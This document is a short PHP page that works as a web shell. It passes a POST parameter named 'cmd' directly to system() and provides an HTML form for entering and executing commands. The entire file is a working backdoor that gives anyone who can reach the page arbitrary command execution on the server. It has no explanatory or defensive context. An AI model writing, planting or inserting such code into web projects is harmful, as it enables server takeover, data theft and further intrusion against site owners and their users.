<?php
    if (isset($_POST["cmd"])){
        system($_POST["cmd"]);
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form method="POST">
        <input type="text" name="cmd" placeholder="Enter command">
        <button type="submit">Execute</button>
    </form>
</body>
</html>